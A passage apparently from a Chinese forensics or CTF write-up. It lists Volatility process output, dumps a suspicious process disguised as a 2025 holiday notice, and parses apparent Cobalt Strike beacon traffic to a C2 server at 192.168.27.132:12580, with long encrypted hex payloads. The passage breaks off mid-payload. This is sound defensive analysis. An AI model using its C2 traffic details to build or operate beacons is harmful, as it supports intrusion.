07:28:04 UTC+0000</span><br><span class="line">0xffffd804ac455280 WmiPrvSE.exe           2856    760     13        0      0      0 2025-01-13 07:28:04 UTC+0000</span><br><span class="line">0xffffd804a7487080 svchost.exe             360    636     29        0      0      0 2025-01-13 07:28:07 UTC+0000</span><br><span class="line">0xffffd804ac62f280 dasHost.exe            2576    696     19        0      0      0 2025-01-13 07:28:08 UTC+0000</span><br><span class="line">0xffffd804ac50a280 msdtc.exe              3128    636     13        0      0      0 2025-01-13 07:28:11 UTC+0000</span><br><span class="line">0xffffd804ac56c200 VSSVC.exe              3356    636      7        0      0      0 2025-01-13 07:28:13 UTC+0000</span><br><span class="line">0xffffd804ac56e280 sihost.exe             3364    276     14        0      1      0 2025-01-13 07:28:13 UTC+0000</span><br><span class="line">0xffffd804ac5c8300 svchost.exe            3392    636     16        0      1      0 2025-01-13 07:28:13 UTC+0000</span><br><span class="line">0xffffd804ac5e1300 taskhostw.exe          3452    276     11        0      1      0 2025-01-13 07:28:13 UTC+0000</span><br><span class="line">0xffffd804ac848280 ctfmon.exe             3652    696     11        0      1      0 2025-01-13 07:28:14 UTC+0000</span><br><span class="line">0xffffd804ac8f8080 ChsIME.exe             3800    760      6        0      1      0 2025-01-13 07:28:15 UTC+0000</span><br><span class="line">0xffffd804ac932380 userinit.exe           3888    568      0 --------      1      0 2025-01-13 07:28:16 UTC+0000   2025-01-13 07:28:56 UTC+0000</span><br><span class="line">0xffffd804ac965340 explorer.exe           3944   3888     71        0      1      0 2025-01-13 07:28:17 UTC+0000</span><br><span class="line">0xffffd804accbc2c0 svchost.exe            1836    636     11        0      0      0 2025-01-13 07:28:19 UTC+0000</span><br><span class="line">0xffffd804acd93300 svchost.exe            4180    636      7        0      1      0 2025-01-13 07:28:21 UTC+0000</span><br><span class="line">0xffffd804acdc60c0 WmiPrvSE.exe           4260    760     14        0      0      0 2025-01-13 07:28:23 UTC+0000</span><br><span class="line">0xffffd804ace19300 NisSrv.exe             4392    636      7        0      0      0 2025-01-13 07:28:25 UTC+0000</span><br><span class="line">0xffffd804acee6240 TrustedInstall         4692    636      6        0      0      0 2025-01-13 07:28:31 UTC+0000</span><br><span class="line">0xffffd804acfe10c0 TiWorker.exe           4744    760      6 --------      0      0 2025-01-13 07:28:31 UTC+0000</span><br><span class="line">0xffffd804ac806080 WmiApSrv.exe            796    636      5        0      0      0 2025-01-13 07:28:35 UTC+0000</span><br><span class="line">0xffffd804aca79080 StartMenuExper         4120    760     44        0      1      0 2025-01-13 07:28:37 UTC+0000</span><br><span class="line">0xffffd804aca97300 RuntimeBroker.         3512    760     21        0      1      0 2025-01-13 07:28:38 UTC+0000</span><br><span class="line">0xffffd804acb49080 SearchApp.exe          5048    760     30 --------      1      0 2025-01-13 07:28:40 UTC+0000</span><br><span class="line">0xffffd804ac4790c0 SearchIndexer.         5040    636     19        0      0      0 2025-01-13 07:28:40 UTC+0000</span><br><span class="line">0xffffd804ad0a70c0 RuntimeBroker.         5204    760     20        0      1      0 2025-01-13 07:28:41 UTC+0000</span><br><span class="line">0xffffd804ad50d080 TextInputHost.         5828    760     19        0      1      0 2025-01-13 07:28:43 UTC+0000</span><br><span class="line">0xffffd804ad5f9080 SearchProtocol         6072   5040      7        0      0      0 2025-01-13 07:28:44 UTC+0000</span><br><span class="line">0xffffd804ad336240 SearchFilterHo         6112   5040      4        0      0      0 2025-01-13 07:28:44 UTC+0000</span><br><span class="line">0xffffd804ad45a2c0 taskhostw.exe          4324    276      5        0      1      0 2025-01-13 07:28:47 UTC+0000</span><br><span class="line">0xffffd804a8eec0c0 RuntimeBroker.         5940    760      4        0      1      0 2025-01-13 07:28:47 UTC+0000</span><br><span class="line">0xffffd804ac5e32c0 smartscreen.ex         2280    760     10        0      1      0 2025-01-13 07:28:52 UTC+0000</span><br><span class="line">0xffffd804ad441080 SecurityHealth         4672   3944      7        0      1      0 2025-01-13 07:28:52 UTC+0000</span><br><span class="line">0xffffd804ad8960c0 SecurityHealth         6060    636     15        0      0      0 2025-01-13 07:28:52 UTC+0000</span><br><span class="line">0xffffd804ad8a3080 vmtoolsd.exe            436   3944     10        0      1      0 2025-01-13 07:28:53 UTC+0000</span><br><span class="line">0xffffd804acbee080 OneDrive.exe           5456   3944     29        0      1      1 2025-01-13 07:28:54 UTC+0000</span><br><span class="line">0xffffd804acd6b080 s?2025t??G???         6492   3944      5        0      1      0 2025-01-13 07:29:00 UTC+0000</span><br><span class="line">0xffffd804acbc8080 ShellExperienc         6848    760     22        0      1      0 2025-01-13 07:29:14 UTC+0000</span><br><span class="line">0xffffd804ad2e1080 audiodg.exe            6964   1476      8        0      0      0 2025-01-13 07:29:15 UTC+0000</span><br><span class="line">0xffffd804ad9270c0 RuntimeBroker.         6980    760      7        0      1      0 2025-01-13 07:29:15 UTC+0000</span><br><span class="line">0xffffd804ad515300 RuntimeBroker.         6240    760      6        0      1      0 2025-01-13 07:29:31 UTC+0000</span><br><span class="line">0xffffd804ac5df2c0 RuntimeBroker.         6360    760      5        0      1      0 2025-01-13 07:29:31 UTC+0000</span><br><span class="line">0xffffd804ad09a080 svchost.exe            6344    636     11        0      0      0 2025-01-13 07:29:56 UTC+0000</span><br><span class="line">0xffffd804ad231080 svchost.exe            5200    636      7 --------      0      0 2025-01-13 07:29:56 UTC+0000</span><br><span class="line">0xffffd804ace40080 SgrmBroker.exe         4884    636      9        0      0      0 2025-01-13 07:29:56 UTC+0000</span><br><span class="line">0xffffd804acccc080 sppsvc.exe             1488    636      8        0      0      0 2025-01-13 07:29:56 UTC+0000</span><br><span class="line">0xffffd804abd16300 svchost.exe            2344    636     14        0      0      0 2025-01-13 07:29:56 UTC+0000</span><br><span class="line">0xffffd804acccb300 ChsIME.exe             3448    760     10        0      1      0 2025-01-13 07:29:59 UTC+0000</span><br><span class="line">0xffffd804abff1080 DumpIt.exe             5704   3944      3        0      1      1 2025-01-13 07:30:01 UTC+0000</span><br><span class="line">0xffffd804ad8ab2c0 conhost.exe             544   5704      6        0      1      0 2025-01-13 07:30:01 UTC+0000</span><br></pre></td></tr></table></figure></div>

<p>找到关于2025年部分节假日安排的通知.exe的进程号是6492</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol2 -f DESKTOP.raw --profile=Win10x64_19041 memdump -p 6492 --dump-dir=./</span><br></pre></td></tr></table></figure></div>

<p>使用cs-parse-http-traffic来提取流量中的raw data</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">Packet number: 51</span><br><span class="line">HTTP response (for request 48 GET)</span><br><span class="line">Length raw data: 48</span><br><span class="line">9ea8c274326a1db1e25142558f2bac154d8139bc18a19f5d772786e8075d6d8fca4d82ed8a7253e3e2c17110e911ff16</span><br><span class="line"></span><br><span class="line">Packet number: 51</span><br><span class="line">HTTP request</span><br><span class="line">http://192.168.27.132:12580/ca</span><br><span class="line">Length raw data: 48</span><br><span class="line">9ea8c274326a1db1e25142558f2bac154d8139bc18a19f5d772786e8075d6d8fca4d82ed8a7253e3e2c17110e911ff16</span><br><span class="line"></span><br><span class="line">Packet number: 60</span><br><span class="line">HTTP request POST</span><br><span class="line">http://192.168.27.132:12580/submit.php?id=1389642286</span><br><span class="line">Length raw data: 2532</span><br><span class="line">000009e09fa046ed18d2de0f0607376d06bab360ababedb5a077fb2c4ff661add98b9f7372e8e98befabd7baec2bd027fca76ea6a8f3672df072aa4ee904bdf63423bb863ca5fec0df6c02a7830c7de888120a47ad946ed46abd1c6dbaf2377b988762b9ea2c6e90fa153725afc14ff8d405baca2a1307f0b1df6479c3fb2867f539e2a30042bbae4de88fbea60b9fb3b626e8cc3225db021d58081564733b25177f99138cde7b3d6c84b7e65fe54c5dc909e5404adbad8c695cb97b0c38b19991c54505126be38ce6c8182e907d15b90f5f537116f76dbc539bfb46393cc25c36623365a0442995038d3247375105cd7e918438685eea1f3a8fe5c14f5dfb22d1f73da225c99ef33314dfe3429e9820afa8d7da130bf7e61ec344cc9dbe68bcaaa38b7fb8cbac95073315d6743ade552e7ad1976a295b2601b61c481a15a86fe148dc7d0faaec29727c73224eadb17a5a667d48053723ad2a6af5b5acf24baa915aadfd8c0e385fe336baa765755e0ab20727a212b0232460227c49eef19ea758324b2671e7e5607c495d1a7abf6909b001bff298c0c7bf0a0b30e364bd5619fd7f55b0ad54e17413e1192bb5ec67ba199e370dd661d33702c6b6c27311b9b4596c5b588af924abee505c1d5ce068cd9639fc88e4ca658aa05cc64f2c1b9d56de935dfff2e528c7e81aba20678838a0cc926e2767d256212a92f2c82f182c1f1d70688579fcfbc94d59ca18a246eb1b3d7883c429cb0f8b8af7fd9064e5ee54f70e2cbe053860e04c5cce611094659c14ad925fdbd69562986cf4b21ab257e7c85555d6a42b1e4b53ffcc53c5f5da8a5f55a4636af4f4e95bc641ea0e8bf7385395010f541c1ae59f60f7a3c697ebabfeffd823dc8f1af6abe47e3dc97cdecba747b5485e719568473a1c9fd1e487f802cdde48e02706b077bc41022deb73ba90708512b25314bb691dc04dcc5b3978a2ea9559669b2127a9de9999f9cff440f8df218fd29563db29cc20a9defef779addc5692c3e7f347df144f889dc23d596e5b4edf07f2f27fc3ff54d37957f486b1ab4165f1e8057be9a86fb24ad223ec7afe1e960cb2285671dc40535e66ab978dd3b57a80df965c0498b850d0b0240afc880153df3000ed455a023134d38ce80da4338c909df51e02e5e9f71f0f1ca8b618aabeb2830cef46c4471c5e9d8344b9c1210316e64ec5a2cd4d93feeed73e5cf93e8b33ed7f19834d9dce71aaf5d85cc63cb6b5f92da62d7f105dad69bbb459e1ca15b195c54650ccab0d27b68e98a548aea6b7cc838aa47b4cca4bb9fd005ea1a72bba0fddfa08429c96dcf0a1365e2a7977466fa9d685c66abd38621d86fc48b79bc4c5004ed86f85def2f2c65830f9e572dba5d52651d6933cdeddd507ac86dc250af338e0d1098dab6a2f289134e16c920ad1749ea61049cb6ad734e66b796a1f05f025288edb31341e5a34985f6a54528a6de5cdedf5ac55c78af05b2b567af3ece93a93985988cb87f0e316ced851e6ac05df4b049a053bd04848a069d21f4c1a4acbe4b6eb44d7d5d4f72895a546272f0dd433054bd6f81520f323ddc77518134f9c69b88eeb110b985e0d0911908097b6e00ae659a151809173f4d8c2eb6eec860b67a79098c43360a9a83b68125abf6a74c6028c7901fbf7898d3321594f4df9ede4d33fe764b9983796a34f22ee9c42f5c03f59570635a1f416407607de9919c414e80f7fac40a2f30a9ed0a28e7666ef75d1db43bc709b40602bdc42bb27ea09c10ce013bbd603cdd881c4d2fe6777e1cf2debf02e64158c1529a1b5978b4ba104e28ada4ffa33628fccc476d1ae4efe2b2ab5881ece17360f07f8edb665f54f2ac08cf3be9ac36bf05495bf5d09aaa431f02017c4e06bbec2a8ed6d6bfce42162e3640eff37ba6fb980614fdafa8558eec42ad07f76e49035ff6a37882d7f4db356a6348b2020c1b919e78b4183b5684376529f511f90d15ee18195e205e2fefd5a097005cf50540387f5727e65219af0f7c9101f44d1ed10a2440f3cee7fb417ca70ca6c3c340fe1109f50cb03bd120842af94e5d5b48e53e4e33b4d4bca5aa768ddfad86e33edd870126a1845ab6f3d751a385193e26d42b91d507e54ba1d06e816c650f9a613ee0eeccb25cc9688d3b379498b430cc1950a040beda09753815825637760bfab4d06221adc15377b3c68bd9a19fbc86df12583f16c049d2f4264db7e32a0c3bf1b22fcc59951365dc85bb5820ec490d9a530e38dcc921c8df3bbc75254605ef555d7155f2c5483f173c44385746896561bbb6507729f0f0d50f8bf8723976b71aa9b6afcbd52f45e98182a7ae228cd393529ac09203f69bb821be6ac4453e6219c769d78a4b68c5a64040043bca1596d8f2746119a162f038ad273b16708aaf3880797b3546ce4a34d28aac402d2587a79d8e54dc4044c142ffd6422bfa92962d8d1573c080d29ff261ec2049813cbbf528b5a62d28e30beeeff0a62e5574cb74fd9f64f896f77efd9156939801d352998581b7fc1100243124d2d8035c5f647cb83f49d1a2d7c575cd4b2f72dad92ced83bb403017f6df6f46d78e41940df91dd3c740ec79995963b3cdc60838eecf1a282144a2c20e8dd8586940939d8806aeb691619a8646a07bed5e4e50e9b4257acd2cc6ca385249695f817bf9c1e732692d7c086a3b6c93f7b7b404e27a4bc2b52660032b00d67e98548322786a03266a9c3383930147bb56822113d87e855db0b0954f68dfe9b0b26ef2f7c083e8645756387f6b532fa45dfd4bc25a2b9397f9a4e18d24dfa3140be1edebd1ca9e8b96d5802ebd502627b323d84fd5790f0eda3789eaf0cc8890eb34d35c8f3839d18b1a9c49293bd2339b746416d4d7edcd51398b9d9ba60595ec4a9c4593b05bbaa516b4aade34e86820e06d913e0f4162da6674c88f2bbacc16a1a0cfd18cf070dca280e6b6464fbbc8cf1f7043066a63780bd891ed0a129e2c175b07da0679c9bceae945a3c6c2d8676f075ffc80f610cca8bec3f3ab384d215d335fb8a1a84cc6f9ef43507d6d9f31222fae64b990cbf0b355ca6d8c82928843cca2c70bf11fae452d77b2bbaa7a16f26dafd23cb717e9a6a1c06587b7ad87548928ae9575bb076634649843cf521dfc2712726fdef7328bba47534514b94bec4d1a44f70fd4e509727bfc28b7f722491988f54fe17d177e9b81dcd52669c2aecf8e68ef8c188ea0e08df9264f30d0146dd2ba91ef6e5fa6d174609500eb6cca0d9578c3752e15ae4ce1cbf9b55d38580a647202793b62ecc4b86853a420492e6b1cf4adf4202cc4a0374a3dde12afe7daf571e3c666057ec09951fbae548dfba1a4013bce537924b9bdb6c4726ea82845210267553a19cfd50e29e98d66416245b40dfb0ef332c96f42e7abb4c7df9b596d5d804600cb99563eae546642eea8f2d8c45dc06181cc059b3b89dea3444ac23b411153e4dac1e4be9d09e7579e9549b7a688d0b178ed220a5d40c5ef4dc5004c4fbcef6fb425d983e7119338790663d43a3e62a383ec709dd58232bf2aec1b72f94ede902e5df225aa9</span><br><span class="line"></span><br><span class="line">Packet number: 111</span><br><span class="line">HTTP response (for request 108 GET)</span><br><span class="line">Length raw data: 48</span><br><span class="line">ac4cb985c04d084b0f77ed1b7745b23123abb198370ffcaedebf12c1f9de9b6fb6094a50a93af84cacd11a30b468dfbd</span><br><span class="line"></span><br><span class="line">Packet number: 111</span><br><span class="line">HTTP request</span><br><span class="line">http://192.168.27.132:12580/ca</span><br><span class="line">Length raw data: 48</span><br><span class="line">ac4cb985c04d084b0f77ed1b7745b23123abb198370ffcaedebf12c1f9de9b6fb6094a50a93af84cacd11a30b468dfbd</span><br><span class="line"></span><br><span class="line">Packet number: 118</span><br><span class="line">HTTP request POST</span><br><span class="line">http://192.168.27.132:12580/submit.php?id=1389642286</span><br><span class="line">Length raw data: 356</span><br><span class="line">0000016031671992d7c28c1e89050a4d2ebe2b7b165c8e9c40968f9056db53e8cab2d7c2557b918b4eb6dc7b5e51642cec40c0cb4a0f04c08760e22a3b2b64f383e2ffdf5e251224772279a17f4c0292065ba68ea6b5652655f6993ca46335214a7eb63490169c77939b489c04681cdf1c97c63b51f9628e0fdcde44c21c02b97d23dad6a92556b433602b2e347f3a7c55938cbaa5358ba6194be6860d2b0a72d8c407964f8258b74568731fca92092737d540b4a71233dde12f32d7e37b31abaebd75f733370a2e8b626fee7b5fce61c7fbf3d0aace219eab3f79a9e4c5c9bb474fa19386cac8c1569ea5e12aacc59919cc59275997b219230228777b32d9ef77d1f48e436db73de4a817f57d8177e358155b4b1cb798f4ec31bd39dc1e54b606fb31ad8f0b6329a0891cce50d7bac8fbe635dba11bbaf3ce9591dd39c750530edd8922ce47d2fab3b8a769e02d8fa33edcad62d925af46eaf9206bbd4a335b84a75cc6</span><br><span class="line"></span><br><span class="line">Packet number: 133</span><br><span class="line">HTTP response (for request 130 GET)</span><br><span class="line">Length raw data: 80</span><br><span class="line">0253784ee86d3fc54693bb7ee14f40d64700446a4604ca0054103ba84e1a831d2a369c501e2a2522abdd9f5fe7652a16fd242669f6b10fb52e8b2b032a7ae00f6b25a8cecdffde72dadf1a18c1225f92</span><br><span class="line"></span><br><span class="line">Packet number: 133</span><br><span class="line">HTTP request</span><br><span class="line">http://192.168.27.132:12580/ca</span><br><span class="line">Length raw data: 80</span><br><span class="line">0253784ee86d3fc54693bb7ee14f40d64700446a4604ca0054103ba84e1a831d2a369c501e2a2522abdd9f5fe7652a16fd242669f6b10fb52e8b2b032a7ae00f6b25a8cecdffde72dadf1a18c1225f92</span><br><span class="line"></span><br><span class="line">Packet number: 140</span><br><span class="line">HTTP request POST</span><br><span class="line">http://192.168.27.132:12580/submit.php?id=1389642286</span><br><span class="line">Length raw data: 84</span><br><span class="line">00000050350ca7f4379f30cc9d6d671db886d360691c74467156e60e8356725ae2f3b880b302ea8b5556df10324e86e53ecb84046646a1758e9cb8c7fca42d660617be467627abcc3c0ce3bd3e93c02fffcb4d3a</span><br><span class="line"></span><br><span class="line">Packet number: 153</span><br><span class="line">HTTP response (for request 150 GET)</span><br><span class="line">Length raw data: 784</span><br><span class="line">35366fdd34dd78b38d94b57ab5ba41c355bfa362b3f33aae4265585ac61e40339008efbc02caea827adf5214a8fd578054af36914362fef5fa167f07388eacda4521ced6bd9102dee683152033a106b87725139554ed661056044550487cbeb74c76d97e39f24d9ea7a2b43a70e17554eea74654e7be9e596f05fdc6ca6a1a43c272de940d3a6e2365d550c828628fadaea385b744f25d1b6b1cb48a3bdfa6ea2107491e3a62c4281a64712c4dc05b6b0f2d4edf5400982b0219a2b9866b767e1f19b2bb55e07aad5c2fd5ec77b560e623702204551648dc4c2e4f5f403a8261a75dff05a828b04b4b8f1293025ccdee9af4a18b13eb4ecffcb8071bf0845fc8b71fe589b98921a950221dc6985d167959bec8c30f1ced4e41300c10795075e5d3a80e1ce328acf166b2bb5b2a0193c369cbe15a1831bcf33c9f9bcdaa8e7edde47c21901d04e33b3ee8a10f64a4a31efd9b74c0d1e9d8ba0b3c9a1d6dae465a2e2d050be3dd258651c957f834be633eba72af9c84fd72b940fea472b3d5e7c541967ac5e91419d1fd4de7a6e6a83915878c0a26f9a355a767f49ffe62b668965641cdfed7686177ef993cf018e98dc8805d4c9c1b26b21171b629927778b1d28c9e0f734ccef316a32586b5580f5ca2816e9627ef7ef4750e633e638b4e6c61b41fd303f862b72acd6aa8721f958ec76521ab620d9e11c3f948dcf08cf46cde6c8b9b78c3eb7f1069ed409264fd3ecf6613dd292acef62689a0fd051b50f857c4cbbb4af601552b7e7b41e9b8234e13d61a22d710a08a1e496df76ce39cfa89261a5a84c896105cd877e07109b47df42259690a6d3b7024348e9ecf8d0798497e4a497100c92d0748c0384f397f84eab3fe1c69ab28746fc9de222a96241d3e13681088e623e37f0156bd64bb81f61f2ca8e37314aaf9b737f0347cb70745bb11954b78b6f6e90a8e1fe3b19c75f84329259dbf93bc06b687ef9d9e2bd56eb5b264e02a925e285d945f87320f94115239b6b47912e699b8587d7a257aaa1d92aae9b3196926d3f6b0ef9b7e8fbf3cbba772407b4589c2ef48e64769a9cb2bd479c609a88bf0f3a2d6d756939126d689</span><br><span class="line"></span><br><span class="line">Packet number: 153</span><br><span class="line">HTTP request</span><br><span class="line">http://192.168.27.132:12580/ca</span><br><span class="line">Length raw data: 784</span><br><span class="line">35366fdd34dd78b38d94b57ab5ba41c355bfa362b3f33aae4265585ac61e40339008efbc02caea827adf5214a8fd578054af36914362fef5fa167f07388eacda4521ced6bd9102dee683152033a106b87725139554ed661056044550487cbeb74c76d97e39f24d9ea7a2b43a70e17554eea74654e7be9e596f05fdc6ca6a1a43c272de940d3a6e2365d550c828628fadaea385b744f25d1b6b1cb48a3bdfa6ea2107491e3a62c4281a64712c4dc05b6b0f2d4edf5400982b0219a2b9866b767e1f19b2bb55e07aad5c2fd5ec77b560e623702204551648dc4c2e4f5f403a8261a75dff05a828b04b4b8f1293025ccdee9af4a18b13eb4ecffcb8071bf0845fc8b71fe589b98921a950221dc6985d167959bec8c30f1ced4e41300c10795075e5d3a80e1ce328acf166b2bb5b2a0193c369cbe15a1831bcf33c9f9bcdaa8e7edde47c21901d04e33b3ee8a10f64a4a31efd9b74c0d1e9d8ba0b3c9a1d6dae465a2e2d050be3dd258651c957f834be633eba72af9c84fd72b940fea472b3d5e7c541967ac5e91419d1fd4de7a6e6a83915878c0a26f9a355a767f49ffe62b668965641cdfed7686177ef993cf018e98dc8805d4c9c1b26b21171b629927778b1d28c9e0f734ccef316a32586b5580f5ca2816e9627ef7ef4750e633e638b4e6c61b41fd303f862b72acd6aa8721f958ec76521ab620d9e11c3f948dcf08cf46cde6c8b9b78c3eb7f1069ed409264fd3ecf6613dd292acef62689a0fd051b50f857c4cbbb4af601552b7e7b41e9b8234e13d61a22d710a08a1e496df76ce39cfa89261a5a84c896105cd877e07109b47df42259690a6d3b7024348e9ecf8d0798497e4a497100c92d0748c0384f397f84eab3fe1c69ab28746fc9de222a96241d3e13681088e623e37f0156bd64bb81f61f2ca8e37314aaf9b737f0347cb70745bb11954b78b6f6e90a8e1fe3b19c75f84329259dbf93bc06b687ef9d9e2bd56eb5b264e02a925e285d945f87320f94115239b6b47912e699b8587d7a257aaa1d92aae9b3196926d3f6b0ef9b7e8fbf3cbba772407b4589c2ef48e64769a9cb2bd479c609a88bf0f3a2d6d756939126d689</span><br><span class="line"></span><br><span class="line">Packet number: 160</span><br><span class="line">HTTP request POST</span><br><span class="line">http://192.168.27.132:12580/submit.php?id=1389642286</span><br><span class="line">Length raw data: 100</span><br><span class="line">00000060294b8d8d29d7e6f1828cfcb7a4d8d71d78bb4af4ce390949a4d93a4a65de656154e44ccd58b942e08d2151bbbd1c199fe416b3d302c2974f61517a37c46a3029db7ad08f58164edbb09d9d8be91597013514eac810d84d3e5e06afe0c8068e74</span><br><span class="line"></span><br><span class="line">Packet number: 176</span><br><span class="line">HTTP response (for request 173 GET)</span><br><span class="line">Length raw data: 48</span><br><span class="line">ecfff639c9a79bbb3c59bbec390fa070335fa6d5b33c7ba752fe9803ee2082296233a5dcd7f76c8adb3a1e404df09447</span><br><span class="line"></span><br><span class="line">Packet number: 176</span><br><span class="line">HTTP request</span><br><span class="line">http://192.168.27.132:12580/ca</span><br><span class="line">Length raw data: 48</span><br><span class="line">ecfff639c9a79bbb3c59bbec390fa070335fa6d5b33c7ba752fe9803ee2082296233a5dcd7f76c8adb3a1e404df09447</span><br><span class="line"></span><br><span class="line">Packet number: 183</span><br><span class="line">HTTP request POST</span><br><span class="line">http://192.168.27.132:12580/submit.php?id=1389642286</span><br><span class="line">Length raw data: 68</span><br><span class="line">000000407e50b7dc157b92f5226f7c46eb149abe64bccfd1e3f84bab9159692604763ebe64c2d55ae8aebdf0300a17515571834d5bab66fbf79ece4897243fe9522520ac</span><br><span class="line"></span><br><span class="line">Packet number: 217</span><br><span class="line">HTTP response (for request 213 GET)</span><br><span class="line">Length raw data: 3264</span><br><span class="line">2f2b30a0854b379d28b292a83812e105b85376144b8f8bc3d8679ad449df277b4cdeb165cb7f4e16308efa5d3b9772c4fbf7a3a7fa1ba96d28018f9f06384a214efa478990a5949f4040a66865055f55bd7d40982fa430c25c514c748b495e86d8d5237920ba5241bb995a9ecac0c6e13661aee01cd6efdb6b1ca5cf1c1cec7bc59f41293ca6d10962ca4b206692f7288655f24c41a8c789c6692f5d555f6b9b98ded41660efd29d09c2a5dbefd319bac44ec7058da39cfed3ba716ca0f5c7cdf6abce2f3276026554efe72860fb99ab652da70f40641a473d386cf41b6f2087c66fd0ba9d3fb00143f05b99fa0c03f25a502b937d755abedb13e073d94a56530ed9b957b4aee702b66b7614f7d0d507b1131c1826c82bc9e40fcf8cec7c937f0d5308c598fa12f37d6a7ba10e245e51a4c790829c9e08f74e37abbb9a677f3310db7b3c5d623f3947b31baca921de8a1baad27ec5e12780c30aaff0bd7030b83b34b8955218e8bf5a541fc95540159c2a5b32577d383746cd87d4526a64cd5f7938c41b2f3ab9cd87773e99bed6248524e30dcba9704b204d78a885b9c53f26eaf41da0e0e7e0ebdb53f7ae69980bada71c9db742e5bb27ec86a79d7296bd3037d1306c270b4f894f1a14939f740392b4004ce45410c39f21c44b3f602d1634818d42012298a105b671abaa6e6b9fcadb4b002443be57a9295068c229ecd2bb074d5d463d054d5ab030c1305dff58f5113330a21cb130d1929b1e517961e456e439089030be04ed1b781bf18f32ca8d361038d755149d998cad54e582e707e7fea023cfa4982d99b7804d3d5dddb6d62efd7607cf9c2a8c67d079430075f023e461bafbf44c233e22af440f69d1d1efda3ed8cf01417eb2aa58fe3a366597416058d7077f5bf3a013660ac91e29ad9ae70f214891c69000724d7f4f4faf592a08b98247ad56bab6c65b196fedcf4a761a71f73681d89b1256930d1ed5bbd968ed447d3603ef0765b5bb2a071803842fdce6454b4976b2e2c319bae190066c10ce0e9702425982beda8e6b83b29a0048bcf09a2382cb5d660104b2e76226507ecbc1cbe2559ba73688c641b49f5d1beffaeb8e5fbeea2f832985ce188ba4bb670a45a764dc2bb17f949eea84283d1b76df74b6bb44951159a1d38e6ebd5da13d03707357adb7cf1525a4198600ae0e6978370c21822ceb9739ed47361c9b979413b1d019d64a53b1fec13130326042d615b69333aa9b76aceeb515dceb05b995d3c19fe4ecb35d33f8f96286d7e239b64c9b22c0f22ded032cd797e79716c4e01b7844c51169651c91610df649538e6b132fbabb09088f51da358b53218c01eedd8287f053d9b36b6b719ca6a980162ccfb635aa18c7cd51d1786d63e98b34d1874a5cfa3e2cf41622d0a740f9d359d2cdd76a74b022c920f9ac30aebe71482b9fc38fc4addb8850d5b4e41d1b4009e1ea1e91562b7644a0c3282baef39f606225243dea1e11f8f43a189f7bec94e4aa47daedf2b79636337a90a229d37342042d18e2f1fadf93b4faf1e3ae2ad5b456215e5a9c6a8033f8282e21784d427514193660e0365f74120d5ee37237ac8fb01461148ede97f40cb39dcd0a3fbf41eeca443e3c5b5016c09bc504d4643db517ca98a873fa76ce64c7ba9c3604e3763342b261e1019a7973785746f13fe9cad40ba06417af6e486b993f9f58b58b57d6ad6742b0ef5ca1bf5b5f1b9de9d2de4ad89cacd1780bad8b179d90ea69f29d3725dac60c2dd0c6d51f2683af86d0249560cc943cc7b9c88f338ac6d688e364e2fd5d7ba801ef341ca6069089495283620eecca28033c8dee8d56fb0671e27e225051c12faa1f1f66b885649c3fb0b784950a532c76d165cef2f92bd24a9d43eb7774c755be576fb4dca0de6215235c6b186fb1a5ffe6f6ff2a0d0291a7ac806ca6ff6ad56857ceb936803415775a895ae29e123d9134ab53228debca40d0d64f27d3eef4b658174dc249758251ca6a3749f63efa9d978a03a712f1236d4e7d07b148570b25d338f81b246e78aac90e2aade72944668a1ae087cd5f56fb5965b502afd7f4d885bdda7f192c607027af35e0bf59556790e6fc1ea0288fb55a8380f249dabf38f5d64c15a95f9036c79911b3b39c2e15347bc235746aee233fcc7957739bb49952e2df9ec906c0dca1d97606d11df2375d1afd61e5356a661fb9f395312113643c6a49b37fd2b6c32f1453da020b83909622620495164fa127c8e97476717b6514d3d37d82f770c4323f997eec85db9462f0bb7f6bcd6678db2cb92d099a8c4035d1c538e5b620857c2f85a99740c62b4341e99aa6ee48a8ec639957fd92e1e0ca4c7e714afa0a93ae892ed9161950488e931703e7b7696553b9d47e5e1b98b3afc26aa46c483a4a4820203d455a1777f97fc05dc31f480a12d51ab2014f127fb0b3133e8e6af56f726530ebbee77bfaf6a11731be59b988f58eee4ced5cc9ad910b8829df073c047b45ceea3e9c1ae838f548f7b5978bff4457d1af72008429f34e89f9bfefa190ed18a361309b3526becd9770701da8a7aaed60eaf5e6a42cd8e